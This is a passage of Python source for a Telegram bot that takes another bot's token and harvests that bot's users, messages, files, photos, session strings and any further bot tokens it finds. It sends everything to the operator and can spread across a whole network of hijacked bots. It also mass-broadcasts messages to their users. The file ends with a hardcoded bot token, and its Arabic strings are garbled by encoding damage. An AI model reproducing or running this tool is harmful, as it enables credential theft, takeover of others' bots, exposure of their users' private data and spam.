                    
                    await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†")
                else:
                    await event.answer("âŒ Ù…Ø§ Ù„Ù‚ÙŠØªØ´ Ø£ÙŠ Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†")
                
            except Exception as e:
                await event.answer("âŒ Ø­ØµÙ„ Ø®Ø·Ø£: {}".format(str(e)))
                
        elif data == 'broadcast':
            await event.answer("ğŸ“¢ Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø¥Ø°Ø§Ø¹Ø©...")
            
            if 'users_list' not in user_states[user_id]:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ù‚Ø§Ø¦Ù…Ø© Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            users = user_states[user_id]['users_list']
            user_states[user_id]['step'] = 'waiting_broadcast_message'
            
            await event.edit("ğŸ“¢ Ø§Ø±Ø³Ù„ Ø§Ù„ÙƒÙ„Ø§Ø´ÙŠÙ‡ (Ø§Ù„Ù†Øµ) Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø§Ù„Ø§Ø°Ø§Ø¹Ù‡ Ø¨Ù‡")
            
        elif data == 'send_tokens':
            await event.answer("ğŸ”‘ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª...")
            
            try:
                if 'analysis' not in user_states[user_id] or 'tokens' not in user_states[user_id]['analysis']:
                    await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ ØªØ­Ù„ÙŠÙ„ Ù„Ù„ØªÙˆÙƒÙ†Ø§Øª. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                    return
                
                tokens = user_states[user_id]['analysis']['tokens']['details']
                
                stop_events[user_id] = asyncio.Event()
                
                stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
                
                seen_tokens = set()
                
                for i, token_info in enumerate(tokens):
                    if user_id in stop_events and stop_events[user_id].is_set():
                        break
                    
                    token = token_info['token']
                    
                    if token in seen_tokens:
                        continue
                    seen_tokens.add(token)
                    
                    is_valid = token_info['valid']
                    
                    if is_valid and 'bot_info' in token_info:
                        bot_info = token_info['bot_info']
                        message = (
                            "ğŸ‰ ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ ØªÙˆÙƒÙ† Ø¨ÙˆØª ØµØ§Ù„Ø­!\n\n"
                            f"ğŸ” Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØªÙˆÙƒÙ†:\n`{token}`\n\n"
                            f"ğŸ¤– Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª:\n"
                            f"â”œ Ø§Ù„Ø§Ø³Ù…: {bot_info.get('bot_name', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                            f"â”œ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: @{bot_info.get('bot_username', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                            f"â”œğŸ“©Ø¹Ø¯Ø¯ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {bot_info.get('total_messages', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                            f"â”œğŸ‘¤Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {bot_info.get('total_users', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                            f"â”” Ø§Ù„Ø¢ÙŠØ¯ÙŠ: {bot_info.get('bot_id', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}"
                        )
                        
                        # Ø¥Ø¶Ø§ÙØ© Ø²Ø± Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ù„Ù„ØªÙˆÙƒÙ† Ø§Ù„ØµØ§Ù„Ø­
                        broadcast_button = [[Button.inline("ğŸ“¢ Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª", f"token_broadcast:{token}")]]
                        await bot.send_message(user_id, message, buttons=broadcast_button)
                    else:
                        pass
                        await bot.send_message(user_id, message)
                    
                    await asyncio.sleep(0.5)
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª")
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await event.answer("âŒ Ø­ØµÙ„ Ø®Ø·Ø£: {}".format(str(e)))
        
        elif data == 'deep_analysis':
            await event.answer("ğŸ” Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ Ø§Ù„Ù…ØªØ¹Ù…Ù‚...")
            
            stop_events[user_id] = asyncio.Event()
            stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
            
            progress_msg = await event.edit("ğŸ” Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ Ø§Ù„Ù…ØªØ¹Ù…Ù‚...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: 0% | Ø§Ù„Ù…Ø³ØªÙˆÙ‰: 0", buttons=stop_button)
            
            last_update_time = 0
            async def update_network_progress(processed, total, level):
                nonlocal last_update_time
                if user_id in stop_events and stop_events[user_id].is_set():
                    return False
                    
                current_time = time.time()
                if current_time - last_update_time >= 5:
                    last_update_time = current_time
                    percent = (processed / total) * 100 if total > 0 else 0
                    await progress_msg.edit(f"ğŸ” Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ Ø§Ù„Ù…ØªØ¹Ù…Ù‚...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: {percent:.1f}% | Ø§Ù„Ù…Ø³ØªÙˆÙ‰: {level}", buttons=stop_button)
                return True
            
            try:
                analysis_result = await deep_network_analysis(
                    bot_token,
                    user_id,
                    update_network_progress,
                    stop_events.get(user_id)
                )
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                if analysis_result['success']:
                    stats = analysis_result['aggregated_stats']
                    
                    network_analysis_data[user_id] = analysis_result
                    
                    # Ø¥Ø¶Ø§ÙØ© Ø±Ø³Ø§Ù„Ø© ØªÙˆØ¶Ø­ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„ÙØ­Øµ Ø¬Ø²Ø¦ÙŠ
                    completion_message = "âœ… ØªÙ… Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ Ø¨Ù†Ø¬Ø§Ø­!" 
                    if analysis_result.get('partial', False):
                        completion_message = "â¹ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø¨ÙƒÙŠ!\nğŸ“Š Ù‡Ø°Ù‡ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ø¬Ø²Ø¦ÙŠØ© Ø§Ù„ØªÙŠ ØªÙ… Ø¬Ù…Ø¹Ù‡Ø§:"
                    
                    stats_message = (
                        f"{completion_message}\n\n"
                        f"ğŸ“Š Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©:\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø¨ÙˆØªØ§Øª: {stats['total_bots']}\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {len(stats['all_users'])}\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {len(stats['all_files'])}\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„ØµÙˆØ± Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {len(stats['all_photos'])}\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {stats['total_tokens']} | {stats['valid_tokens']}âœ…\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {stats['total_sessions']}\n"
                        f"â€¢ Ù…Ø³ØªÙˆÙŠØ§Øª Ø§Ù„ØªÙØ±Ø¹: {analysis_result['total_levels']}\n\n"
                        f"ğŸ‘¤ Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø¥Ù„Ù‰ Ø­Ø³Ø§Ø¨Ùƒ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹"
                    )
                    
                    buttons = [
                        [Button.inline("ğŸ“¦ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª", "network_send_files"), Button.inline("ğŸ–¼ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±", "network_send_photos")],
                        [Button.inline("ğŸ” Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª", "network_send_sessions"), Button.inline("ğŸ”‘ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª", "network_send_tokens")],
                        [Button.inline("ğŸ“¢ Ø¥Ø°Ø§Ø¹Ø© Ø´Ø¨ÙƒÙŠØ©", "network_broadcast")]
                    ]
                    
                    await progress_msg.edit(stats_message, buttons=buttons)
                else:
                    await progress_msg.edit(f"âŒ ÙØ´Ù„ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ: {analysis_result['error']}")
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await progress_msg.edit(f"âŒ Ø­ØµÙ„ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ: {str(e)}")
        
        elif data.startswith('token_broadcast:'):
            token = data.split(':', 1)[1]
            await event.answer("ğŸ“¢ Ø¨Ø¯Ø¡ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ù…Ø­Ø¯Ø¯...")
            
            user_states[user_id]['current_broadcast_token'] = token
            user_states[user_id]['step'] = 'waiting_token_broadcast_message'
            
            await event.edit("ğŸ“¢ Ø§Ø±Ø³Ù„ Ø§Ù„Ù†Øµ Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø¥Ø°Ø§Ø¹ØªÙ‡ Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª")
        
        elif data == 'network_broadcast':
            await event.answer("ğŸ“¢ Ø¨Ø¯Ø¡ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ©...")
            
            if user_id not in network_analysis_data:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            user_states[user_id]['step'] = 'waiting_network_broadcast_message'
            
            await event.edit("ğŸ“¢ Ø§Ø±Ø³Ù„ Ø§Ù„Ù†Øµ Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø¥Ø°Ø§Ø¹ØªÙ‡ Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")
        
        elif data == 'network_send_files':
            await event.answer("ğŸ“¦ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©...")
            
            if user_id not in network_analysis_data:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            analysis_data = network_analysis_data[user_id]
            all_bots = analysis_data['all_bots']
            
            success = await network_send_files(bot, all_bots, user_id)
            
            if success:
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…Ù„ÙØ§Øª Ø§Ù„Ø´Ø¨ÙƒØ©")
            else:
                await event.answer("âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ Ù…Ù„ÙØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")
        
        elif data == 'network_send_photos':
            await event.answer("ğŸ–¼ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©...")
            
            if user_id not in network_analysis_data:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            analysis_data = network_analysis_data[user_id]
            all_bots = analysis_data['all_bots']
            
            success = await network_send_photos(bot, all_bots, user_id)
            
            if success:
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ± Ø§Ù„Ø´Ø¨ÙƒØ©")
            else:
                await event.answer("âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ ØµÙˆØ± ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")
        
        elif data == 'network_send_tokens':
            await event.answer("ğŸ”‘ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©...")
            
            if user_id not in network_analysis_data:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            analysis_data = network_analysis_data[user_id]
            all_bots = analysis_data['all_bots']
            
            success = await network_send_tokens(bot, all_bots, user_id)
            
            if success:
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©")
            else:
                await event.answer("âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ ØªÙˆÙƒÙ†Ø§Øª ØµØ§Ù„Ø­Ø© ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")
        
        elif data == 'network_send_sessions':
            await event.answer("ğŸ” Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©...")
            
            if user_id not in network_analysis_data:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            analysis_data = network_analysis_data[user_id]
            all_bots = analysis_data['all_bots']
            
            success = await network_send_sessions(bot, all_bots, user_id)
            
            if success:
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©")
            else:
                await event.answer("âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¬Ù„Ø³Ø§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")

    @bot.on(events.NewMessage(func=lambda e: e.is_private))
    async def message_handler(event):
        user_id = event.sender_id
        if user_id not in user_states:
            return

        state = user_states[user_id]
        text = event.text.strip()

        if text.startswith('/'):
            return

        if state['step'] == 'waiting_token':
            if ':' not in text:
                await event.respond("âŒ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠØŒ Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ù„ÙŠ Ø§Ù†Øª Ø¯Ø®Ù„ØªÙ‡ Ù…Ø´ ØµØ­! Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            state['token'] = text
            state['step'] = 'analyzing'
            
            progress_msg = await event.respond("â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª ÙˆØ§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: 0%")
            
            async def update_analysis_progress(current, total, percent):
                try:
                    await progress_msg.edit(f"â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª ÙˆØ§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: {percent:.1f}% ({total})")
                except:
                    pass
                return True
            
            analysis = await analyze_bot(state['token'], user_id, update_analysis_progress)
            
            if not analysis['success']:
                await progress_msg.edit(f"âŒ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠØŒ ÙÙŠ Ù…Ø´ÙƒÙ„Ø© ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø¨ÙˆØª\nØ§Ù„Ø®Ø·Ø£: {analysis['error']}")
                del user_states[user_id]
                return
            
            state['analysis'] = analysis
            state['max_id'] = analysis['total_messages']
            state['step'] = 'analyzed'
            
            stats_message = (
                f"âœ… ØªÙ… Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù†Ø¬Ø§Ø­!\n\n"
                f"ğŸ¤– Ø§Ù„Ø¨ÙˆØª: @{analysis['bot_username']}\n\n"
                f"ğŸ“Š Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª:\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {analysis['total_messages']}\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {analysis['total_users']}\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ù„ÙØ§Øª: {analysis['total_files']}\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„ØµÙˆØ±: {analysis['total_photos']}\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª: {analysis['tokens']['total']} | {analysis['tokens']['valid']}âœ…\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø¬Ù„Ø³Ø§Øª: {analysis['sessions']['total']}\n\n"
                f"ğŸ‘¤ Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø¥Ù„Ù‰ Ø­Ø³Ø§Ø¨Ùƒ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹"
            )
            
            buttons = [
                [Button.inline("ğŸ“¤ Ø³Ø­Ø¨ ÙƒÙ„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„", "all_messages")],
                [Button.inline("ğŸ“¦ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª", "send_files"), Button.inline("ğŸ–¼ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±", "send_photos")],
                [Button.inline("ğŸ” Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª", "send_sessions"), Button.inline("ğŸ‘¥ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†", "send_users")],
                [Button.inline("ğŸ”‘ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª", "send_tokens"), Button.inline("ğŸ” ÙØ­Øµ Ù…ÙØµÙ„ ÙƒØ§Ù…Ù„", "deep_analysis")]
            ]
            
            await progress_msg.edit(stats_message, buttons=buttons)
            
        elif state['step'] == 'waiting_broadcast_message':
            broadcast_text = text
            users = state['users_list']
            total_users = len(users)
            
            stop_events[user_id] = asyncio.Event()
            stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
            
            progress_msg = await event.respond(f"ğŸš€ Ø¨Ø¯Ø¡ Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù†Øµ Ø¥Ù„Ù‰ {total_users} Ù…Ø³ØªØ®Ø¯Ù…...", buttons=stop_button)
            broadcast_messages[user_id] = progress_msg
            
            last_update_time = 0
            async def update_broadcast_progress(current, total):
                nonlocal last_update_time
                if user_id in stop_events and stop_events[user_id].is_set():
                    return False
                    
                current_time = time.time()
                if current_time - last_update_time >= 5 or current == total:
                    last_update_time = current_time
                    percent = (current / total) * 100
                    try:
                        await progress_msg.edit(f"ğŸ“¤ Ø¬Ø§Ø±ÙŠ Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ù†Øµ: {current}/{total} ({percent:.1f}%)", buttons=stop_button)
                    except:
                        pass
                return True
            
            try:
                success, failed = await broadcast_message(
                    state['token'],
                    users,
                    broadcast_text,
                    update_broadcast_progress,
                    stop_events.get(user_id)
                )
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                await progress_msg.edit(f"ğŸ‰ Ø®Ù„ØµÙ†Ø§ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠ Ùˆ Ø¹Ù…Ù„Øª Ø§Ø°Ø§Ø¹Ù‡!\nâœ… Ù†Ø¬Ø­Ù†Ø§ ÙÙŠ Ø§Ø±Ø³Ø§Ù„ {success} Ø±Ø³Ø§Ù„Ø©\nâŒ ÙØ´Ù„Ù†Ø§ ÙÙŠ Ø§Ø±Ø³Ø§Ù„ {failed} Ø±Ø³Ø§Ù„Ø©")
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await progress_msg.edit(f"âŒ Ø­ØµÙ„ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø©: {str(e)}")
        
        elif state['step'] == 'waiting_token_broadcast_message':
            broadcast_text = text
            token = state['current_broadcast_token']
            
            try:
                users = await extract_users_from_bot(token, user_id)
                total_users = len(users)
                
                stop_events[user_id] = asyncio.Event()
                stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
                
                progress_msg = await event.respond(f"ğŸš€ Ø¨Ø¯Ø¡ Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ù…Ù† Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø«Ø§Ù†ÙˆÙŠ Ø¥Ù„Ù‰ {total_users} Ù…Ø³ØªØ®Ø¯Ù…...", buttons=stop_button)
                
                last_update_time = 0
                async def update_token_broadcast_progress(current, total):
                    nonlocal last_update_time
                    if user_id in stop_events and stop_events[user_id].is_set():
                        return False
                        
                    current_time = time.time()
                    if current_time - last_update_time >= 5 or current == total:
                        last_update_time = current_time
                        percent = (current / total) * 100
                        try:
                            await progress_msg.edit(f"ğŸ“¤ Ø¬Ø§Ø±ÙŠ Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ù†Øµ: {current}/{total} ({percent:.1f}%)", buttons=stop_button)
                        except:
                            pass
                    return True
                
                success, failed = await broadcast_message(
                    token,
                    users,
                    broadcast_text,
                    update_token_broadcast_progress,
                    stop_events.get(user_id)
                )
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                await progress_msg.edit(f"ğŸ‰ Ø®Ù„ØµÙ†Ø§ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠ!\nâœ… Ù†Ø¬Ø­Ù†Ø§ ÙÙŠ Ø§Ø±Ø³Ø§Ù„ {success} Ø±Ø³Ø§Ù„Ø©\nâŒ ÙØ´Ù„Ù†Ø§ ÙÙŠ Ø§Ø±Ø³Ø§Ù„ {failed} Ø±Ø³Ø§Ù„Ø©")
                
                del state['current_broadcast_token']
                state['step'] = 'analyzed'
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await event.respond(f"âŒ Ø­ØµÙ„ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø©: {str(e)}")
        
        elif state['step'] == 'waiting_network_broadcast_message':
            broadcast_text = text
            
            if user_id not in network_analysis_data:
                await event.respond("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            analysis_data = network_analysis_data[user_id]
            all_bots = analysis_data['all_bots']
            
            stop_events[user_id] = asyncio.Event()
            stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
            
            progress_msg = await event.respond(f"ğŸš€ Ø¨Ø¯Ø¡ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ© Ø¥Ù„Ù‰ {len(all_bots)} Ø¨ÙˆØª...", buttons=stop_button)
            
            last_update_time = 0
            async def update_network_broadcast_progress(current, total, success_count, failed_count):
                nonlocal last_update_time
                if user_id in stop_events and stop_events[user_id].is_set():
                    return False
                    
                current_time = time.time()
                if current_time - last_update_time >= 5 or current == total:
                    last_update_time = current_time
                    percent = (current / total) * 100
                    try:
                        await progress_msg.edit(
                            f"ğŸ“¤ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ©: {current}/{total} ({percent:.1f}%)\n"
                            f"âœ… Ù†Ø¬Ø­: {success_count} | âŒ ÙØ´Ù„: {failed_count}",
                            buttons=stop_button
                        )
                    except:
                        pass
                return True
            
            try:
                total_success, total_failed = await network_broadcast(
                    all_bots,
                    broadcast_text,
                    update_network_broadcast_progress,
                    stop_events.get(user_id)
                )
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                await progress_msg.edit(
                    f"ğŸ‰ Ø®Ù„ØµÙ†Ø§ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠ Ù…Ù† Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ©!\n"
                    f"âœ… Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ù†Ø¬Ø§Ø­: {total_success} Ø±Ø³Ø§Ù„Ø©\n"
                    f"âŒ Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„ÙØ´Ù„: {total_failed} Ø±Ø³Ø§Ù„Ø©\n"
                    f"ğŸ“Š Ø¹Ø¨Ø± {len(all_bots)} Ø¨ÙˆØª"
                )
                
                state['step'] = 'analyzed'
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await progress_msg.edit(f"âŒ Ø­ØµÙ„ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ©: {str(e)}")
    
    print("Starting bot...")
    await bot.start(bot_token='8495657230:AAEO3I9TE19oAM6GkMJN7RvnYzBpBrmjJlQ')
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())